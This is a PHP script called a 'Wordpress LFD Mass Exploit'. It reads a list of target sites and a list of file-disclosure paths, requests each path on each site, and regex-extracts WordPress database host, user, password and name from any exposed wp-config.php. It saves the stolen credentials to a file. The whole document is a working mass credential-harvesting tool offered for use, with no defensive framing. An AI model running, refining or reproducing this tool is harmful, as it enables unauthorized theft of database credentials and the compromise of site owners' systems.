<?php
error_reporting(0);
set_time_limit(66);

print "

php sc.php list.txt [ use http:// or https:// ]

" ;
/*
/////////////////////////////////
// Wordpress LFD Mass Exploit //
///////////////////////////////
* ! Custom path.txt as your path list exploit LFD
*   Use php filename.php list.txt
* ! This tool is not so good because it tries all the path on one website so it takes too long
*   The output list will be saved in the name wptv.txt
*/

if(!file_exists($argv[1])){
  echo "\n\t usage : php $argv[0] list.txt \n";
}

$get=file_get_contents($argv[1]);
$ex=explode("\r\n",$get);
echo "\tTotal sites Loaded :".count($ex)."\n\n";
foreach ($ex as $urls){
	echo "[+] $urls \n";
	// add your path/exploit of LFD Wordpress
	$path = file('path.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	foreach($path as $key){
$ah = ($urls).($key);
$g=@file_get_contents($ah);
     if(preg_match_all ("#require_once\(ABSPATH . 'wp-settings.php'\);#i", $g)){ 
                if (preg_match ("#define\('DB_HOST', '(.*?)'\);#i", $g, $f)){
                        $wpth= "[!] DB_HOST : ". $f[1]. "\n";
						echo $wpth;
				}
                if (preg_match ("#define\('DB_USER', '(.*?)'\);#i", $g, $f)){
                        $wptu= "[!] DB_USER : ". $f[1]. "\n";
                        echo $wptu;
                }
                if (preg_match ("#define\('DB_PASSWORD', '(.*?)'\);#i", $g, $f)){
                        $wptp=  "[!] DB_PASSWORD : ". $f[1]. "\n";
                        echo $wptp;
                }
                if (preg_match ("#define\('DB_NAME', '(.*?)'\);#i", $g, $f)){
                        $wptn= "[!] DB_NAME : ". $f[1]. "\n\n";
                        echo $wptn;
                }
		$fp = fopen("wptv.txt", 'a+');
				fwrite($fp,"$urls\n$wpth$wptu$wptp$wptn");
				fclose($fp);
			}
		}
	}
?>
